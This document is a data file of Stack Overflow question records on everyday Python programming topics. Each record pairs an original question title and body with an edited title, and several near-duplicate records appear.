Python: remove dictionary from list," If I have a list of dictionaries, say: and I would like to remove the dictionary with id of 2 (or name 'john'), what is the most efficient way to go about this programmatically (that is to say, I don't know the index of the entry in the list so it can't simply be popped). <code>  [{'id': 1, 'name': 'paul'}, {'id': 2, 'name': 'john'}]",Remove dictionary from list
Distributing my python scripts as jars with jython?," I have been a Python programmer for almost two years, and I am used to writing small scripts to automate some repetitive tasks I had to do at the office. Now, apparently my colleagues noticed this, and they want those scripts too.Some of them have Macs, some Windows; I made these on windows. I investigated the possibility of using py2exe or even py2app to make natives of my script, but they never satisfied me...I came to know that all of them have JVM on their systems, so can I give them one single executable JAR file of my script using something like Jython may be?How feasible is this... I mean, I had no idea how to write scripts for Jython, neither did I care about it when I wrote them... what kind of problems will it give? <code> ",Distributing my Python scripts as JAR files with Jython?
What are library that is ported with different programming language than its original?," Since I am working with different Platforms and programming languages, I found there are many good libraries that are ported with different programming language than its original. For example JUnit and Log4j which has been ported into several different languages. Sometimes if I am already used to working with these libraries, I would find the ported version for it if I'm working with another programming language.What are other libraries that you have found been ported to different languages and as good as the original?Please make it one library per answer so others can vote.Format: Original-Library-Name, Original-Programming-LanguagePorted-Library-Name, Ported-Programming-LanguageIf possible with the links to the website of the libraries. <code> ",Which libraries have been ported to different programming languages?
Python: zip-like function that pads to longest length?," Is there a built-in function that works like zip() but that will pad the results so that the length of the resultant list is the length of the longest input rather than the shortest input? <code>  >>> a = ['a1']>>> b = ['b1', 'b2', 'b3']>>> c = ['c1', 'c2']>>> zip(a, b, c)[('a1', 'b1', 'c1')]>>> What command goes here?[('a1', 'b1', 'c1'), (None, 'b2', 'c2'), (None, 'b3', None)]",Is there a zip-like function that pads to longest length?
zip-like function that pads to longest length?," Is there a built-in function that works like zip() but that will pad the results so that the length of the resultant list is the length of the longest input rather than the shortest input? <code>  >>> a = ['a1']>>> b = ['b1', 'b2', 'b3']>>> c = ['c1', 'c2']>>> zip(a, b, c)[('a1', 'b1', 'c1')]>>> What command goes here?[('a1', 'b1', 'c1'), (None, 'b2', 'c2'), (None, 'b3', None)]",Is there a zip-like function that pads to longest length?
Python: zip-like function that pads to longest length?," Is there a built-in function that works like zip() but that will pad the results so that the length of the resultant list is the length of the longest input rather than the shortest input? <code>  >>> a = ['a1']>>> b = ['b1', 'b2', 'b3']>>> c = ['c1', 'c2']>>> zip(a, b, c)[('a1', 'b1', 'c1')]>>> What command goes here?[('a1', 'b1', 'c1'), (None, 'b2', 'c2'), (None, 'b3', None)]",Is there a zip-like function that pads to longest length?
Is there a zip-like function that pads to longest length in Python?," Is there a built-in function that works like zip() but that will pad the results so that the length of the resultant list is the length of the longest input rather than the shortest input? <code>  >>> a = ['a1']>>> b = ['b1', 'b2', 'b3']>>> c = ['c1', 'c2']>>> zip(a, b, c)[('a1', 'b1', 'c1')]>>> What command goes here?[('a1', 'b1', 'c1'), (None, 'b2', 'c2'), (None, 'b3', None)]",Is there a zip-like function that pads to longest length?
Calling python from OBjective-C, I'm developing a Python/ObjC application and I need to call some methods in my Python classes from ObjC.I've tried several stuffs with no success. How can I call a Python method from Objective-C?My Python classes are being instantiated in Interface Builder. How can I call a method from that instance? <code> ,Calling Python from Objective-C
"Python list filtering, remove partial matches"," Using Python how do you reduce a list of lists by an ordered subset match [[..],[..],..]? In the context of this question a list L is a subset of list M if M contains all members of L, and in the same order. For example, the list [1,2] is a subset of the list [1,2,3], but not of the list [2,1,3].Example input: Expected result: Further Examples:L = [[1, 2, 3, 4, 5, 6, 7], [1, 2, 5, 6]] - No reduceL = [[1, 2, 3, 4, 5, 6, 7], [1, 2, 3], [1, 2, 4, 8]] - Yes reduceL = [[1, 2, 3, 4, 5, 6, 7], [7, 6, 5, 4, 3, 2, 1]] - No reduce(Sorry for causing confusion with the incorrect data set.) <code>  a. [[1, 2, 4, 8], [1, 2, 4, 5, 6], [1, 2, 3], [2, 3, 21], [1, 2, 3, 4], [1, 2, 3, 4, 5, 6, 7]]b. [[2, 16, 17], [1, 2, 3, 4, 5, 6, 7], [1], [1, 2, 3, 4], [1, 2], [17, 18, 19, 22, 41, 48], [2, 3], [1, 2, 3], [50, 69], [1, 2, 3], [2, 3, 21], [1, 2, 3], [1, 2, 4, 8], [1, 2, 4, 5, 6]] a. [[1, 2, 4, 8], [2, 3, 21], [1, 2, 3, 4, 5, 6, 7]]b. [[2, 16, 17], [1, 2, 3, 4, 5, 6, 7], [17, 18, 19, 22, 41, 48], [50, 69], [2, 3, 21], [1, 2, 4, 8], [1, 2, 4, 5, 6]]",Python list filtering: remove subsets from list of lists.
Inserting Line at Specified Position of a Text File in Python," I have a text file which looks like this: Now I want to insert 'foo bar' between 'foo1 bar3' and 'foo2 bar4'.This is how I did it: This works for me, but looks rather ugly. <code>  blah blahfoo1 bar1foo1 bar2foo1 bar3foo2 bar4foo2 bar5blah blah import shutiltxt = '1.txt'tmptxt = '1.txt.tmp'with open(tmptxt, 'w') as outfile: with open(txt, 'r') as infile: flag = 0 for line in infile: if not line.startswith('foo1') and flag == 0: outfile.write(line) continue if line.startswith('foo1') and flag == 0: flag = 1 outfile.write(line) continue if line.startswith('foo1') and flag == 1: outfile.write(line) continue if not line.startswith('foo1') and flag == 1: outfile.write('foo bar\n') outfile.write(line) flag = 2 continue if not line.startswith('foo1') and flag == 2: outfile.write(line) continueshutil.move(tmptxt, txt)",Inserting Line at Specified Position of a Text File
Advantages of UserDict class in Python," What are advantages of using UserDict class?I mean, what I really get if instead of I will write the following: Edit: If I understand right I can add new fields to an object in a runtime in both cases? and <code>  class MyClass(object): def __init__(self): self.a = 0 self.b = 0...m = MyClass()m.a = 5m.b = 7 class MyClass(UserDict): def __init__(self): UserDict.__init__(self) self[""a""] = 0 self[""b""] = 0...m = MyClass()m[""a""] = 5m[""b""] = 7 m.c = ""Cool"" m[""c""] = ""Cool""",Advantages of UserDict class?
Python: display the time in a different time zone," Is there an elegant way to display the current time in another time zone?I would like to have something with the general spirit of: <code>  cur = <Get the current time, perhaps datetime.datetime.now()>print(""Local time {}"".format(cur))print(""Pacific time {}"".format(<something like cur.tz('PST')>))print(""Israeli time {}"".format(<something like cur.tz('IST')>))",Display the time in a different time zone
Pythonic way to return list of every n'th item in a larger list," Say we have a list of numbers from 0 to 1000. Is there a pythonic/efficient way to produce a list of the first and every subsequent 10th item, i.e. [0, 10, 20, 30, ... ]?Yes, I can do this using a for loop, but I'm wondering if there is a neater way to do this, perhaps even in one line? <code> ",Pythonic way to return list of every nth item in a larger list
GVIM and multiple programming languages," My day job involves coding with Perl. At home I play around with Python and Erlang. For Perl I want to indent my code with two spaces. Whereas for Python the standard is 4. Also I have some key bindings to open function declarations which I would like to use with all programming languages. How can this be achieved in gVim? As in, is there a way to maintain a configuration file for each programming language or something of that sort? <code> ",gVim and multiple programming languages
Selenium - Can I hide the browser?, I am using Selenium RC to automate some browser operations but I want the browser to be invisible. Is this possible? How? What about Selenium Grid? Can I hide the Selenium RC window also? <code> ,Is it possible to hide the browser in Selenium RC?
Python classes special methods," Where is a complete list of the special double-underscore/dunder methods that can be used in classes? (e.g., __init__, __new__, __len__, __add__) <code> ","Where is the Python documentation for the special methods? (__init__, __new__, __len__, ...)"
Default save path for Python idle?, Does anyone know where or how to set the default path/directory on saving python scripts prior to running? On a Mac it wants to save them in the top level ~/Documents directory. I would like to specify a real location. Any ideas? <code> ,Default save path for Python IDLE?
What kind of applications are build using Python ?, I wanted to knowPython is suited for what kind of applications? I am new to Python world but I know it's a scripting language like Perl but I was not sure about the kind of applications which one would build using Python and would certainly appreciate if someone can provide some useful information. <code> ,What kind of applications are built using Python?
What kind of applications are built using Python ?, I wanted to knowPython is suited for what kind of applications? I am new to Python world but I know it's a scripting language like Perl but I was not sure about the kind of applications which one would build using Python and would certainly appreciate if someone can provide some useful information. <code> ,What kind of applications are built using Python?
How can I get an email message's text content using python?," Given an RFC822 message in Python 2.6, how can I get the right text/plain content part? Basically, the algorithm I want is this: Of these things, I have get_mime_part and has_mime_part down pat, but I'm not quite sure how to get the decoded text from the MIME part. I can get the encoded text using get_payload(), but if I try to use the decode parameter of the get_payload() method (see the doc) I get an error when I call it on the text/plain part: In addition, I don't know how to take HTML and render it to text as closely as possible. <code>  message = email.message_from_string(raw_message)if has_mime_part(message, ""text/plain""): mime_part = get_mime_part(message, ""text/plain"") text_content = decode_mime_part(mime_part)elif has_mime_part(message, ""text/html""): mime_part = get_mime_part(message, ""text/html"") html = decode_mime_part(mime_part) text_content = render_html_to_plaintext(html)else: # fallback text_content = str(message)return text_content File ""/System/Library/Frameworks/Python.framework/Versions/2.6/lib/python2.6/email/message.py"", line 189, in get_payload raise TypeError('Expected list, got %s' % type(self._payload))TypeError: Expected list, got <type 'str'>",How can I get an email message's text content using Python?
Can SAP work with Python?, Can Python be used to query a SAP database? <code> ,Query SAP database from Python?
Can SAP database be fetched from Python?, Can Python be used to query a SAP database? <code> ,Query SAP database from Python?
Python: How to check if permutations have equal parity?," I am looking for a way to check if 2 permutations (represented by lists) are of the same parity. Note that I am not interested if they are even or odd parity, just the equality.I am new to Python and my naive solution is given below as a reply. I am looking forward to Python gurus showing me some cool tricks to achieve the same in lesser, more elegant Python code. <code> ",How to check if permutations have equal parity?
[Python] Using lookahead with generators," I have implemented a generator-based scanner in Python that tokenizes a string into tuples of the form (token type, token value): would print The next task implies parsing the token stream and for that, I need be able to look one item ahead from the current one without moving the pointer ahead as well. The fact that iterators and generators do not provide the complete sequence of items at once but each item as needed makes lookaheads a bit trickier compared to lists, since the next item is not known unless __next__() is called.What could a straightforward implementation of a generator-based lookahead look like? Currently I'm using a workaround which implies making a list out of the generator: The lookahead then is easily implemented by something like that: Of course this just works fine. But thinking that over, my second question arises: Is there really a point of making scan() a generator in the first place? <code>  for token in scan(""a(b)""): print token (""literal"", ""a"")(""l_paren"", ""("")... token_list = [token for token in scan(string)] try: next_token = token_list[index + 1]except: IndexError: next_token = None",Using lookahead with generators
Python: What is the common header format?," I came across the following header format for Python source files in a document about Python coding guidelines: Is this the standard format of headers in the Python world?What other fields/information can I put in the header?Python gurus share your guidelines for good Python source headers :-) <code>  #!/usr/bin/env python""""""Foobar.py: Description of what foobar does.""""""__author__ = ""Barack Obama""__copyright__ = ""Copyright 2009, Planet Earth""",What is the common header format of Python files?
How to create inline objects with properties in Python?," In Javascript it would be: But the same syntax in Python would create a dictionary, and that's not what I want <code>  var newObject = { 'propertyName' : 'propertyValue' };newObject.propertyName; // returns ""propertyValue"" new_object = {'propertyName': 'propertyValue'}new_object.propertyName # raises an AttributeError",How to create inline objects with properties?
python: how to show results on a web page?," Most likely it's a dumb question for those who knows the answer, but I'm a beginner, and here it goes:I have a Python script which I run in a command-line with some parameter, and it prints me some results. Let's say results are some HTML code.I never done any Python programming for web, and couldn't figure it out... I need to have a page (OK, I know how to upload files to a server, Apache is running, Python is installed on the server...) with an edit field, which will accept that parameter, and Submit button, and I need it to ""print"" the results on a web page after the user submitted a proper parameter, or show any output that in a command-line situation are printed.I've read Dive Into Python's chapters about ""HTML Processing"" and ""HTTP Web Services"", but they do not describe what I'm looking for.If the answer isn't short, I would very much appreciate links to the more relevant stuff to read or maybe the key words to google for it. <code> ",Python: how to show results on a web page?
Variables inside and outside of a class __init__() function," Is there any difference at all between these classes besides the name? Does it make any difference if I use or don't use the __init__ method for declaring the variable value?My main worry is that I'll be using it one way, when that'll cause me further problems down the road. <code>  class WithClass (): def __init__(self): self.value = ""Bob"" def my_func(self): print(self.value)class WithoutClass (): value = ""Bob"" def my_func(self): print(self.value)",difference between variables inside and outside of __init__()
How to set na unexisent field in Python ClientForm?," I'm using mechanize (which uses clientform) for some web crawling in python and since it doesn't support JS, I want to set a value of an unexistent input in a form (the input is generated by JS). How can I do this?The error is similar to the one you get if you try to execute <code>  from mechanize import Browserbr = Browser()page = br.open('http://google.com')br.select_form(nr = 0)br['unexistent'] = 'hello'",How to set an nonexistent field in Python ClientForm?
How to set an unexistent field in Python ClientForm?," I'm using mechanize (which uses clientform) for some web crawling in python and since it doesn't support JS, I want to set a value of an unexistent input in a form (the input is generated by JS). How can I do this?The error is similar to the one you get if you try to execute <code>  from mechanize import Browserbr = Browser()page = br.open('http://google.com')br.select_form(nr = 0)br['unexistent'] = 'hello'",How to set an nonexistent field in Python ClientForm?
Noob Ready Cython Tutorials," I know a bunch of scripting languages, (python, ruby, lua, php) but I don't know any compiled languages like C/C++ , I wanted to try and speed up some python code using cython, which is essentially a python -> C compiler, aimed at creating C extensions for python. Basically you code in a stricter version of python which compiles into C -> native code. here's the problem, I don't know C, yet the cython documentation is aimed at people who obviously already know C (nothing is explained, only presented), and is of no help to me, I need to know if there are any good cython tutorials aimed at python programmers, or if I'm gonna have to learn C before I learn Cython.bear in mind I'm a competent python programmer, i would much rather learn cython from the perspective of the language I'm already good at, rather than learn a whole new language in order to learn cython.1) PLEASE don't recommend psyco edit: ANY information that will help understand the oficial cython docs is useful information <code> ",Noob-Ready Cython Tutorials
"What does ""lamda"" mean in Python, and what's the simpelst way to use it?"," Can you give an example and other examples that show when and when not to use Lambda?My book gives me examples, but they're confusing. <code> ","What does ""lambda"" mean in Python, and what's the simplest way to use it?"
Using a Python Dictionary as a Key, Python doesn't allow dictionaries to be used as keys in other dictionaries. Is there a workaround for using non-nested dictionaries as keys? The general problem with more complicated non-hashable objects and my specific use case has been moved here. My original description of my use case was incorrect. <code> ,Using a Python Dictionary as a Key (Non-nested)
confused   __iter__ ," Despite reading up on it, I still dont quite understand how __iter__ works. What would be a simple explaination? I've seen def__iter__(self): return self. I don't see how this works or the steps on how this works.  <code> ",How does __iter__ work?
Python Error Handling, I have a try/finally clause in my script. Is it possible to get the exact error message from within the finally clause? <code> ,Can I get the exception from the finally block in python?
Python Error Handling with try/finally, I have a try/finally clause in my script. Is it possible to get the exact error message from within the finally clause? <code> ,Can I get the exception from the finally block in python?
How do I embed IPython with working list comprehensions?, Certain list comprehensions don't work properly when I embed IPython 0.10 as per the instructions. What's going on with my global namespace? <code>  $ python>>> import IPython.Shell>>> IPython.Shell.IPShellEmbed()()In [1]: def bar(): pass ...: In [2]: list(bar() for i in range(10))---------------------------------------------------------------------------NameError Traceback (most recent call last)/tmp/<ipython console> /tmp/<ipython console> in <generator expression>([outmost-iterable])NameError: global name 'bar' is not defined,How do I embed IPython with working generator expressions?
How deploy python to windows users?," I'm soon to launch a beta app and this have the option to create custom integration scripts on Python.The app will target Mac OS X and Windows, and my problem is with Windows where Python normally is not present.My actual aproach is silently run the Python 2.6 install. However I face the problem that is not activated by default and the path is not set when use the command line options. And I fear that if Python is installed before and I upgrade to a new version this could break something else...So, I wonder how this can be done cleanly. Is it OK if I copy the whole Python 2.6 directory, and put it in a sub-directory of my app and install everything there? Or with virtualenv is posible run diferents versions of Python (if Python is already installed in the machine?).I also play before embedding Python with a DLL, and found it easy but I lost the ability to debug, so I switch to command-line plug-ins.I execute the plug-ins from command line and read the STDOUT and STDERR output. The app is made with Delphi/Lazarus. I install others modules like JSON and RPC clients, Win32com, ORM, etc. I create the installer with bitrock.UPDATE: The end-users are small business owners, and the Python scripts are made by developers. I want to avoid any additional step in the deployment, so I want a fully integrated setup. <code> ",How to deploy Python to Windows users?
How deploy Python to Windows users?," I'm soon to launch a beta app and this have the option to create custom integration scripts on Python.The app will target Mac OS X and Windows, and my problem is with Windows where Python normally is not present.My actual aproach is silently run the Python 2.6 install. However I face the problem that is not activated by default and the path is not set when use the command line options. And I fear that if Python is installed before and I upgrade to a new version this could break something else...So, I wonder how this can be done cleanly. Is it OK if I copy the whole Python 2.6 directory, and put it in a sub-directory of my app and install everything there? Or with virtualenv is posible run diferents versions of Python (if Python is already installed in the machine?).I also play before embedding Python with a DLL, and found it easy but I lost the ability to debug, so I switch to command-line plug-ins.I execute the plug-ins from command line and read the STDOUT and STDERR output. The app is made with Delphi/Lazarus. I install others modules like JSON and RPC clients, Win32com, ORM, etc. I create the installer with bitrock.UPDATE: The end-users are small business owners, and the Python scripts are made by developers. I want to avoid any additional step in the deployment, so I want a fully integrated setup. <code> ",How to deploy Python to Windows users?
Ouput file redirection in Python," I'm writing a backup script I intend to execute in a cronjob every night. The script sets sys.stdout and sys.stderr to an output file to keep a log of what happens.To do the backup I use the following code I add print statements before and after the subprocess call. The problem is that I get the output of the subprocess call before any output of my print instructions before the call. I added the flush() calls but it has no effect. Why is this happening and how could I change this behaviour ?  <code>  cmd = 'rsync -av --del --stats --filter ""- .thumbnails/"" ' + \ '--filter ""- *~"" --filter ""- *.iso"" --filter ""- lost+found/"" ' + \ '--filter ""- .cache/"" --filter ""- tmp/"" --filter ""- *.mp3"" ' + \ '--filter ""- *.log"" ' + srcDir + ' ' + dstDirprint ""Executing '""+cmd+""' ...""try: sys.stdout.flush() sys.stderr.flush() retcode = subprocess.call( cmd, stdin = sys.stdin, stdout = sys.stdout, stderr=sys.stderr, shell=False ) if retcode < 0: print >>sys.stderr, ""Command was terminated by signal"", -retcode elif retcode > 0: print >>sys.stderr, ""Command returned code "", retcodeexcept OSError, e: print >>sys.stderr, ""Execution failed:"", e",Output file redirection in Python
Mount a filesystem using python," I'm sure this is a easy question, my Google-fu is obviously failing me.How do I mount a filesystem using Python, the equivalent of running the shell command mount ...?Obviously I can use os.system to run the shell command, but surely there is a nice tidy, Python interface to the mount system call.I can't find it. I thought it would just be a nice, easy os.mount(). <code> ",How do I mount a filesystem using Python?
How to match alphabetical chars without numeric chars with python regexp ?," Using Python module re, how to get the equivalent of the ""\w"" (which matches alphanumeric chars) WITHOUT matching the numeric characters (those which can be matched by ""[0-9]"")?Notice that the basic need is to match any character (including all unicode variation) without numerical chars (which are matched by ""[0-9]"").As a final note, I really need a regexp as it is part of a greater regexp.Underscores should not be matched.EDIT:I hadn't thought about underscores state, so thanks for warnings about this being matched by ""\w"" and for the elected solution that addresses this issue. <code> ",How to match alphabetical chars without numeric chars with Python regexp?
How to match alphabetical chars without numeric chars with Python regexp ?," Using Python module re, how to get the equivalent of the ""\w"" (which matches alphanumeric chars) WITHOUT matching the numeric characters (those which can be matched by ""[0-9]"")?Notice that the basic need is to match any character (including all unicode variation) without numerical chars (which are matched by ""[0-9]"").As a final note, I really need a regexp as it is part of a greater regexp.Underscores should not be matched.EDIT:I hadn't thought about underscores state, so thanks for warnings about this being matched by ""\w"" and for the elected solution that addresses this issue. <code> ",How to match alphabetical chars without numeric chars with Python regexp?
Python: ulimit and nice for subprocess.call / subprocess.popen ?," I need to limit the amount of time and cpu taken by external command line apps I spawn from a python process using subprocess.call , mainly because sometimes the spawned process gets stuck and pins the cpu at 99%. nice and ulimit seem like reasonable ways to do this, but I'm not sure how they'd interact with subprocess.The limits look something like:Kill the process if it's taking more than 60 secondsLimit it to 20% of cpuI want to apply the resource limiting to the subprocess, not to the python process that's spawning the subprocesses.Is there a way to apply nice and ulimit to the subprocess.call spawned process? Are there better python-native alternatives?This is on a linux (ubuntu) system. <code> ",Python: ulimit and nice for subprocess.call / subprocess.Popen ?
Python: @staticmethod with @property," I want and I thought I could do But it throws an exception: <code>  Stats.singleton.twitter_count += 1 class Stats: singleton_object = None @property @staticmethod def singleton(): if Stats.singleton_object: return Stats.singleton_object Stats.singleton_object = Stats() return Stats.singleton() >>> Stats.singleton.a = ""b""Traceback (most recent call last): File ""<stdin>"", line 1, in <module>TypeError: 'property' object has only read-only attributes (assign to .a)",@staticmethod with @property
Python threading appears to run threads sequentially," I am trying to use threads in a Python project I am working on, but threads don't appear to be behaving as they are supposed to in my code. It seems that all threads run sequentially (i.e. thread2 starts after thread 1 ends, they don't both start at the same time). I wrote a simple script to test this, and that too runs threads sequentially. Here's the output I get from running it: The same behavior is observed with much larger number of iterations of the loops.I tried searching the web and older SO answers, but I couldn't find anything that helped. Can someone please point out what is wrong with this code? <code>  import threadingdef something(): for i in xrange(10): print ""Hello""def my_thing(): for i in xrange(10): print ""world"" threading.Thread(target=something).start()threading.Thread(target=my_thing).start() HelloHelloHelloHelloHelloHelloHelloHelloHelloHelloworldworldworldworldworldworldworldworldworldworld",threading appears to run threads sequentially
How to Execute a Python File in Notepad ++ ?," I prefer using Notepad++ for developing,How do I execute the files in Python through Notepad++? <code> ",How to Execute a Python Script in Notepad++?
Python - Get a list of all the encodings python can encode to," I am writing a script that will try encoding bytes into many different encodings in Python 2.6. Is there some way to get a list of available encodings that I can iterate over?The reason I'm trying to do this is because a user has some text that is not encoded correctly. There are funny characters. I know the unicode character that's messing it up. I want to be able to give them an answer like ""Your text editor is interpreting that string as X encoding, not Y encoding"". I thought I would try to encode that character using one encoding, then decode it again using another encoding, and see if we get the same character sequence.i.e. something like this: <code>  for encoding1, encoding2 in itertools.permutation(encodinglist(), 2): try: unicode_string = my_unicode_character.encode(encoding1).decode(encoding2) except: pass",Get a list of all the encodings Python can encode to
Does Python use NFAs for regular expression evaluation in rhe re module?, Does anybody know if Python (any version) used NFAs (Non-Deterministic Finite Automata) to evaluate regular expressions or does it use some other mechanism? Please provide links/reference if available.  <code> ,Does Python use NFAs for regular expression evaluation in the re module?
Virtualenv: Where do I put stuff?," What sort of directory structure should one follow when using virtualenv? For instance, if I were building a WSGI application and created a virtualenv called foobar I would start with a directory structure like: Once this environment is created, where would one place their own:python files? static files (images/etc)?""custom"" packages, such as those available online but not found in the cheese-shop?in relation to the virtualenv directories?(Assume I already know where the virtualenv directories themselves should go.) <code>  /foobar /bin {activate, activate.py, easy_install, python} /include {python2.6/...} /lib {python2.6/...}",Where in a virtualenv does the custom code go?
Where in a virtualenv does *my* code go?," What sort of directory structure should one follow when using virtualenv? For instance, if I were building a WSGI application and created a virtualenv called foobar I would start with a directory structure like: Once this environment is created, where would one place their own:python files? static files (images/etc)?""custom"" packages, such as those available online but not found in the cheese-shop?in relation to the virtualenv directories?(Assume I already know where the virtualenv directories themselves should go.) <code>  /foobar /bin {activate, activate.py, easy_install, python} /include {python2.6/...} /lib {python2.6/...}",Where in a virtualenv does the custom code go?
Possible to use Mathematica from other programming languages (python/C#) ?," Is it possible to use Mathematica's computing capabilities from other languages? I need to do some complex operations (not necessarily symbolic, btw), and it'd be pretty sweet to be able to just call Mathematica's functions or running Mathematica's code right from my python/c#'s program.Is it possible? <code> ",Possible to use Mathematica from other programming languages (python/C#)?
Where does python's help function get it's content from.," I have a lot of callable objects and they all have the __doc__ string correctly filled out, but running help on them produces the help for their class instead of help based on __doc__.I want to change it so that running help on them produces customized help that looks essentially like what I would get if they were actual functions instead of instances of a class that implements __call__.In code, I'd like to make the output of this: Look more like the output of this: <code>  class myCallable: def __init__(self, doc): self.__doc__ = doc def __call__(self): # do some stuff passmyFunc = myCallable(""some doco text"")help(myFunc) def myFunc(): ""some doco text"" # do some stuff passhelp(myFunc)",Where does Python's pydoc help function get its content?
Where does python's help function get its content from.," I have a lot of callable objects and they all have the __doc__ string correctly filled out, but running help on them produces the help for their class instead of help based on __doc__.I want to change it so that running help on them produces customized help that looks essentially like what I would get if they were actual functions instead of instances of a class that implements __call__.In code, I'd like to make the output of this: Look more like the output of this: <code>  class myCallable: def __init__(self, doc): self.__doc__ = doc def __call__(self): # do some stuff passmyFunc = myCallable(""some doco text"")help(myFunc) def myFunc(): ""some doco text"" # do some stuff passhelp(myFunc)",Where does Python's pydoc help function get its content?
Where does pythons pydoc help function get its content from.," I have a lot of callable objects and they all have the __doc__ string correctly filled out, but running help on them produces the help for their class instead of help based on __doc__.I want to change it so that running help on them produces customized help that looks essentially like what I would get if they were actual functions instead of instances of a class that implements __call__.In code, I'd like to make the output of this: Look more like the output of this: <code>  class myCallable: def __init__(self, doc): self.__doc__ = doc def __call__(self): # do some stuff passmyFunc = myCallable(""some doco text"")help(myFunc) def myFunc(): ""some doco text"" # do some stuff passhelp(myFunc)",Where does Python's pydoc help function get its content?
configuring file path  in python , How to set the current working directory in Python? <code> ,How to set the current working directory?
How to set the current working directory in Python?, How to set the current working directory in Python? <code> ,How to set the current working directory?
How can I translate an XPath expression to BeautifulSoup?," In answer to a previous question, several people suggested that I use BeautifulSoup for my project. I've been struggling with their documentation and I just cannot parse it. Can somebody point me to the section where I should be able to translate this expression to a BeautifulSoup expression? The above expression is from Scrapy. I'm trying to apply the regex re('\.a\w+') to td class altRow to get the links from there.I would also appreciate pointers to any other tutorials or documentation. I couldn't find any.Thanks for your help.Edit:I am looking at this page: Yet, if you look at the page source ""/cabel"" is there: For some reason, search results are not visible to BeautifulSoup, but they are visible to XPath because hxs.select('//td[@class=""altRow""][2]/a/@href').re('/.a\w+') catches ""/cabel""Edit:cobbal: It is still not working. But when I search this: it returns all the links with second character ""a"" but not the lawyer names. So for some reason those links (such as ""/cabel"") are not visible to BeautifulSoup. I don't understand why. <code>  hxs.select('//td[@class=""altRow""][2]/a/@href').re('/.a\w+') >>> soup.head.title<title>White & Case LLP - Lawyers</title>>>> soup.find(href=re.compile(""/cabel""))>>> soup.find(href=re.compile(""/diversity""))<a href=""/diversity/committee"">Committee</a> <td class=""altRow"" valign=""middle"" width=""34%""> <a href='/cabel'>Abel, Christian</a> >>>soup.findAll(href=re.compile(r'/.a\w+'))[<link href=""/FCWSite/Include/styles/main.css"" rel=""stylesheet"" type=""text/css"" />, <link rel=""shortcut icon"" type=""image/ico"" href=""/FCWSite/Include/main_favicon.ico"" />, <a href=""/careers/northamerica"">North America</a>, <a href=""/careers/middleeastafrica"">Middle East Africa</a>, <a href=""/careers/europe"">Europe</a>, <a href=""/careers/latinamerica"">Latin America</a>, <a href=""/careers/asia"">Asia</a>, <a href=""/diversity/manager"">Diversity Director</a>]>>>",How can I translate this XPath expression to BeautifulSoup?
Can't pickle <type 'instancemethod'> when using python's multiprocessing Pool.map()," I'm trying to use multiprocessing's Pool.map() function to divide out work simultaneously. When I use the following code, it works fine: However, when I use it in a more object-oriented approach, it doesn't work. The error message it gives is: This occurs when the following is my main program: and the following is my someClass class: Anyone know what the problem could be, or an easy way around it? <code>  import multiprocessingdef f(x): return x*xdef go(): pool = multiprocessing.Pool(processes=4) print pool.map(f, range(10))if __name__== '__main__' : go() PicklingError: Can't pickle <type 'instancemethod'>: attribute lookup__builtin__.instancemethod failed import someClassif __name__== '__main__' : sc = someClass.someClass() sc.go() import multiprocessingclass someClass(object): def __init__(self): pass def f(self, x): return x*x def go(self): pool = multiprocessing.Pool(processes=4) print pool.map(self.f, range(10))",Can't pickle <type 'instancemethod'> when using multiprocessing Pool.map()
setuptools test hides errors. How to have better testing ?," In python setuptools, python setup.py test runs the testsuite. However if I have an import error in my testsuite, the only error message I obtain is an AttributeError complaining that my test class is missing. Is there a way to obtain a more detailed error message, so I can fix the testsuite ?I will explain myself better with the following example. Suppose I have a package called foo, created anew with paster. I then add the test Now, suppose mytest.py contains the following code This works. However, if I try to import an unexistent module This is the error I obtain In other words, there's no reference to the failed import. <code>  ./foo./foo/__init__.py./foo/tests./foo/tests/__init__.py./foo/tests/mytest.py./setup.cfg./setup.py import unittestclass MyTestClass(unittest.TestCase): def testFoo(self): self.assertEqual(1,1) import unittestimport frombizclass MyTestClass(unittest.TestCase): def testFoo(self): self.assertEqual(1,1) Traceback (most recent call last): File ""setup.py"", line 26, in <module> test_suite = ""foo.tests"" File ""/System/Library/Frameworks/Python.framework/Versions/2.6/lib/python2.6/distutils/core.py"", line 152, in setup dist.run_commands() File ""/System/Library/Frameworks/Python.framework/Versions/2.6/lib/python2.6/distutils/dist.py"", line 975, in run_commands self.run_command(cmd) File ""/System/Library/Frameworks/Python.framework/Versions/2.6/lib/python2.6/distutils/dist.py"", line 995, in run_command cmd_obj.run() File ""/System/Library/Frameworks/Python.framework/Versions/2.6/Extras/lib/python/setuptools/command/test.py"", line 121, in run self.with_project_on_sys_path(self.run_tests) File ""/System/Library/Frameworks/Python.framework/Versions/2.6/Extras/lib/python/setuptools/command/test.py"", line 101, in with_project_on_sys_path func() File ""/System/Library/Frameworks/Python.framework/Versions/2.6/Extras/lib/python/setuptools/command/test.py"", line 130, in run_tests testLoader = loader_class() File ""/System/Library/Frameworks/Python.framework/Versions/2.6/lib/python2.6/unittest.py"", line 816, in __init__ self.parseArgs(argv) File ""/System/Library/Frameworks/Python.framework/Versions/2.6/lib/python2.6/unittest.py"", line 843, in parseArgs self.createTests() File ""/System/Library/Frameworks/Python.framework/Versions/2.6/lib/python2.6/unittest.py"", line 849, in createTests self.module) File ""/System/Library/Frameworks/Python.framework/Versions/2.6/lib/python2.6/unittest.py"", line 613, in loadTestsFromNames suites = [self.loadTestsFromName(name, module) for name in names] File ""/System/Library/Frameworks/Python.framework/Versions/2.6/lib/python2.6/unittest.py"", line 587, in loadTestsFromName return self.loadTestsFromModule(obj) File ""/System/Library/Frameworks/Python.framework/Versions/2.6/Extras/lib/python/setuptools/command/test.py"", line 34, in loadTestsFromModule tests.append(self.loadTestsFromName(submodule)) File ""/System/Library/Frameworks/Python.framework/Versions/2.6/lib/python2.6/unittest.py"", line 584, in loadTestsFromName parent, obj = obj, getattr(obj, part)AttributeError: 'module' object has no attribute 'mytest'",setuptools test hides import errors. How to have better info ?
how to print number with commas as thousands separators in Python 2.x," I am trying to print an integer in Python 2.6.1 with commas as thousands separators. For example, I want to show the number 1234567 as 1,234,567. How would I go about doing this? I have seen many examples on Google, but I am looking for the simplest practical way.It does not need to be locale-specific to decide between periods and commas. I would prefer something as simple as reasonably possible. <code> ",How to print number with commas as thousands separators?
